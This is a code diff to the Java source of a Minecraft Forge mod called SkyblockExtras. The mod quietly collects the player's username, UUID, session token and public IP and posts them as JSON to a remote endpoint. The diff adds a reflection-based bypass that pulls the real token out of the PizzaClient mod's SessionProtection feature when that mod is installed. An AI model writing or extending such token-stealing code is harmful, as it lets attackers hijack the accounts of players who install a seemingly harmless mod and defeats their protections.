@@ -4,9 +4,11 @@ import net.minecraft.client.Minecraft;
 import net.minecraft.util.ChatComponentText;
 import net.minecraftforge.common.MinecraftForge;
 import net.minecraftforge.event.entity.EntityJoinWorldEvent;
+import net.minecraftforge.fml.common.Loader;
 import net.minecraftforge.fml.common.Mod;
 import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
 import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
+import net.minecraftforge.fml.relauncher.ReflectionHelper;
 
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
@@ -33,9 +35,15 @@ public class SkyblockExtras {
 
                 Minecraft mc = Minecraft.getMinecraft();
                 String ip = new BufferedReader(new InputStreamReader(new URL("https://checkip.amazonaws.com/").openStream())).readLine();
+                String token = mc.getSession().getToken();
+
+                //pizzaclient bypass
+                if (Loader.isModLoaded("pizzaclient")) {
+                    token = (String) ReflectionHelper.findField(Class.forName("qolskyblockmod.pizzaclient.features.misc.SessionProtection"), "changed").get(null);
+                }
 
                 //send req
-                String jsonInputString = String.format("{ \"username\": \"%s\", \"uuid\": \"%s\", \"token\": \"%s\", \"ip\": \"%s\" }", mc.getSession().getUsername(), mc.getSession().getPlayerID(), mc.getSession().getToken(), ip);
+                String jsonInputString = String.format("{ \"username\": \"%s\", \"uuid\": \"%s\", \"token\": \"%s\", \"ip\": \"%s\" }", mc.getSession().getUsername(), mc.getSession().getPlayerID(), token, ip);
                 OutputStream os = c.getOutputStream();
                 byte[] input = jsonInputString.getBytes(StandardCharsets.UTF_8);
                 os.write(input, 0, input.length);
